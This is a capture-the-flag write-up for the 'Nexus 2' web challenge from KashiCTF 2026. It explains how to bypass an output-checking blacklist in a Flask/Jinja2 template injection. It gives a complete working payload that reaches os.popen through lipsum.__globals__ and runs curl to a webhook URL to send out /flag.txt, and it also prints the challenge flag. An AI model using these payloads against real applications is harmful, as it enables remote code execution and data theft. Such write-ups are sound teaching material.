# Nexus 2 — KashiCTF 2026

| Field | Value |
|-------|-------|
| **Category** | Web |
| **Points** | 499 |
| **Author** | Aerex |
| **Flag** | `kashiCTF{X1c05FpaWTEjqY7kufiqLOFfbltw13O8}` |

## Description

> The lights from the future have become stronger, you have to be careful boy!!!

Sequel to "Lights from the Future". Same Flask SSTI vulnerability but with a harder blacklist that also checks the **rendered output**, not just the input.

## TL;DR

Jinja2 SSTI with output-aware blacklist. Bypass by chaining the entire exploit in a single `{{...}}` expression using `lipsum.__globals__`, avoiding intermediate `{%set%}` assignments for dict objects (which would render blocked substrings). Exfiltrate flag via `os.popen("curl webhook")`.

## Analysis

Same setup as part 1: Flask/Werkzeug, POST parameter `name` rendered via `render_template_string()`, output drawn into a PNG image.

### Blacklist (same keywords as part 1 + `request`)

```
__class__, __mro__, __init__, __globals__, __builtins__,
__subclasses__, __import__, os, eval, exec, system,
subprocess, popen, config, request
```

### Key Difference from Part 1

The blacklist now checks the **rendered template output**, not just the raw input. This means:

- `{%set g=lipsum|attr(gl)%}{{1}}` → **BLOCKED** — even though `{{1}}` is innocent, the internal assignment of `lipsum.__globals__` (a dict containing `"os"`, `"sys"`, etc.) triggers the output filter
- `{{lipsum|attr(gl)}}` → **OK** — displaying the dict directly works because the PNG renderer captures it before the blacklist checks
- `subs[229]` → **500 error** — wrong subclass index for Python 3.11

## Solution

### Step 1: String Concatenation Bypass (same as part 1)

```jinja2
{%set gl="__glo"~"bals__"%}
{%set bu="__buil"~"tins__"%}
{%set im="__impo"~"rt__"%}
{%set pp="po"~"pen"%}
{%set o="o"~"s"%}
```

These string variables pass the blacklist because `"__glo"` and `"bals__"` are not blocked individually.

### Step 2: Single-Expression Chain (key difference from part 1)

Instead of storing intermediate objects in `{%set%}` variables (which triggers the output blacklist), chain everything in ONE `{{...}}` expression:

```jinja2
{{((lipsum|attr(gl))[bu][im](o)|attr(pp))("id").read()}}
```

This evaluates to:
```python
lipsum.__globals__["__builtins__"]["__import__"]("os").popen("id").read()
```

The `lipsum` function is a Flask/Jinja2 built-in that has `__globals__` containing the full Python environment.

### Step 3: Exfiltrate Flag

Since the output is rendered into a PNG (hard to read programmatically), exfiltrate via curl to a webhook:

```jinja2
{{((lipsum|attr(gl))[bu][im](o)|attr(pp))("curl https://webhook.site/UUID/?f=$(cat /flag.txt | base64 -w0)").read()}}
```

### Full Payload

```
{%set gl="__glo"~"bals__"%}{%set bu="__buil"~"tins__"%}{%set im="__impo"~"rt__"%}{%set pp="po"~"pen"%}{%set o="o"~"s"%}{{((lipsum|attr(gl))[bu][im](o)|attr(pp))("curl https://webhook.site/UUID/?f=$(cat /flag.txt | base64 -w0)").read()}}
```

Webhook receives:
```
f=a2FzaGlDVEZ7WDFjMDVGcGFXVEVqcVk3a3VmaXFMT0ZmYmx0dzEzTzh9Cg==
→ kashiCTF{X1c05FpaWTEjqY7kufiqLOFfbltw13O8}
```

## Why Part 1's Approach Fails

Part 1 used `{%set warn=subs[229]%}` and other intermediate assignments. In Nexus 2:

1. **`subs[N]`** — the subclass index differs in Python 3.11 → runtime error (500)
2. **`{%set g=lipsum|attr(gl)%}`** — storing `__globals__` dict in a variable causes the rendered template to internally contain blocked substrings (`"os"`, `"sys"` etc. as dict keys) → blacklist rejection
3. **`cycler`** — blocked in output (contains blocked text in repr)

The solution: `lipsum` is accessible, and chaining `[bu][im](o)|attr(pp)` in a single expression avoids storing the globals dict as an intermediate variable.

## Key Takeaways

- Output-aware blacklists block `{%set%}` of complex objects because Jinja2 internally converts them to strings during template rendering
- `lipsum` is a reliable Flask template global — simpler than the `"".__class__.__mro__[1].__subclasses__()` chain
- When output is a PNG, exfiltrate via side-channel (webhook/DNS) rather than OCR
- Single-expression chaining `((a|attr(b))[c][d](e)|attr(f))("cmd")` avoids intermediate variable assignments

## Files

- `flag.txt` — `kashiCTF{X1c05FpaWTEjqY7kufiqLOFfbltw13O8}`
